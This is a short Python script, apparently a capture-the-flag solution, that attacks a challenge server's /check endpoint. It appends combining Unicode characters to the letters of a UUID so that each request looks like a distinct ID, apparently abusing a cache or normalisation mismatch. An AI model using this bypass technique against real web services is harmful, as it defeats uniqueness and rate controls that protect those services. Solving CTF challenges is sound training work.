import requests


orig = "23c16f81-5868-41b6-bc2f-42aec0dedf56"

unicode = ['\u0308', '\u20DE', '\u20DD', '\u20DB', '\u0308\u20DE', '\u0308\u20DE\u20DB', '\u20DE\u20DD', '\u20DE\u20DD\u20DB', '\u0308\u20DD', '\u0308\u20DD\u20DB', '\u0308\u20DE\u20DD', '\u0308\u20DE\u20DD\u20DB']

letters = ['a', 'b', 'c', 'd', 'e', 'f']

final = ''

counter = 0

url = 'https://cache-it-to-win-it.chall.lac.tf/check'
cookie = {'id':orig}


for i in range(len(orig)):
    if orig[i] in letters:
        for option in unicode:
            counter += 1
            newid = orig[:i] + orig[i] + option + orig[i + 1:] 
            print (newid)
            res = requests.get(url, cookies=cookie, params={'uuid':newid})
            if 'Only' in res.text: 
                index = res.text.find('Only')
                print (res.text[index:index+24])
            else:
                print (res.text)

print ('=' * 50)
print (counter)